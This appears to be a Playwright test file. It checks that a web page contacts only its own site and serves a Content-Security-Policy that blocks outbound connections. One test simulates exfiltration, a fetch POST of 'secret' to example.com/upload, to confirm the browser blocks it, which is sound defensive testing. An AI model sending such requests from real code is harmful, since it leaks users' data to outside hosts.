import { expect, test } from "@playwright/test";
import { watchOutbound } from "./helpers";

test("the page loads without contacting anything but this site", async ({ page, baseURL }) => {
  const outbound = watchOutbound(page, baseURL!);
  await page.goto("/");
  await page.waitForLoadState("networkidle");
  expect(outbound).toEqual([]);
});

test("the security policy is served and blocks outbound requests", async ({ page }) => {
  const response = await page.goto("/");
  const csp = response!.headers()["content-security-policy"];
  expect(csp).toContain("connect-src 'self'");
  expect(response!.headers()["referrer-policy"]).toBe("no-referrer");

  const blocked = await page.evaluate(async () => {
    try {
      await fetch("https://example.com/upload", { method: "POST", body: "secret" });
      return false;
    } catch {
      return true;
    }
  });
  expect(blocked).toBe(true);
});
